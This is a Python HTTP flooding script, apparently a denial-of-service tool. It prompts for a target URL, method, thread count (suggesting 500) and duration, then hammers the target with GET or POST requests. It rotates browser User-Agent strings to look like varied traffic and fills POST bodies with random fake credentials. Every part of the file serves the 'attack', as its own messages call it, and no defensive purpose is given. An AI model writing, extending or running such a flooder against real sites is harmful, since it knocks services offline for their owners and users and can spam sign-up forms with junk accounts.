import requests
import threading
import time
from collections import Counter
import random
import string

# Generate a list of headers (50 headers)
def generate_headers():
    headers = [
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134'},
        {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:40.0) Gecko/20100101 Firefox/40.0'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'},
        {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0'},
        # Add 40 more headers here for rotation...
    ]
    return headers

# Generate random data for POST requests
def generate_random_data():
    data = {
        'username': ''.join(random.choices(string.ascii_letters + string.digits, k=8)),
        'password': ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
        'email': f"{''.join(random.choices(string.ascii_letters, k=5))}@example.com"
    }
    return data

# Function to send requests
def send_request(url, request_sent, stop_event, method):
    headers = generate_headers()  # Get random headers
    session = requests.Session()  # Use session for connection pooling
    while not stop_event.is_set():
        try:
            header = random.choice(headers)
            if method == "POST":
                data = generate_random_data()
                response = session.post(url, headers=header, data=data, timeout=5)
            else:
                response = session.get(url, headers=header, timeout=5)
            
            status_codes.append(response.status_code)
            request_sent[0] += 1  # Use a list to update the request count in a thread-safe manner
            print(f"Request Sent! Status Code: {response.status_code}, Total Sent: {request_sent[0]}")
        except Exception as e:
            status_codes.append(str(e))
            print(f"Error: {e}")

# Function to start the attack
def start_attack(url, threads_count, request_sent, stop_event, method):
    threads = []
    for _ in range(threads_count):
        thread = threading.Thread(target=send_request, args=(url, request_sent, stop_event, method))
        threads.append(thread)
        thread.start()

    # Wait for threads to finish
    for thread in threads:
        thread.join()

# Function to print final report
def final_report(request_sent):
    counter = Counter(status_codes)
    print("\nRequest Results Summary:")
    for code, count in counter.items():
        print(f"Status Code {code}: {count} times")
    print(f"\nTotal Requests Sent: {request_sent[0]}")
    print("Attack Complete!")

# Main function to execute the script
def main():
    url = input("Enter the URL: ")
    method = input("Enter the request method (GET or POST): ").upper()
    threads_count = int(input("Enter the number of threads (e.g., 500): "))  # Increase threads for more power
    duration = int(input("Enter the duration of the attack in seconds (e.g., 60): "))
    
    request_sent = [0]  # Using a list to track the request count
    global status_codes
    status_codes = []

    stop_event = threading.Event()

    try:
        print("Starting the attack...")
        attack_thread = threading.Thread(target=start_attack, args=(url, threads_count, request_sent, stop_event, method))
        attack_thread.start()

        # Run the attack for the specified duration
        time.sleep(duration)
        stop_event.set()  # Signal the threads to stop
        attack_thread.join()

        final_report(request_sent)

    except KeyboardInterrupt:
        print("\nAttack interrupted by user.")
        stop_event.set()  # Signal the threads to stop
        final_report(request_sent)

    print("END of attack!")

if __name__ == "__main__":
    main()